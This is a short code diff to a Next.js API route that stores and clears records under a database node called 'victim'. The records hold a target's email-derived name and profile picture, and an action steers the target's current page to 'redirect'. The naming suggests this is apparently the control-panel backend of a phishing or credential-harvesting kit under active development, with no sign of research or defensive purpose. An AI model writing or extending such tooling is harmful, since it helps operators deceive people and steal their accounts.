@@ -97,7 +97,7 @@ export async function POST(request: NextRequest) {
           victimUpdate.name = body.email.split('@')[0];
           victimUpdate.profilePicture = ''; // Default or empty profile picture
         }
-        await set(ref(db, 'victim'), victimUpdate);
+        await update(ref(db, 'victim'), victimUpdate);
         return NextResponse.json({ success: true });
       }
 
@@ -140,6 +140,10 @@ export async function POST(request: NextRequest) {
           currentPage: 'redirect'
         });
         return NextResponse.json({ success: true });
+
+      case 'clearVictimData':
+        await set(ref(db, 'victim'), initialState.victim);
+        return NextResponse.json({ success: true, message: 'Victim data cleared' });
 
       case 'reset':
         await set(ref(db, 'config'), initialState.config);
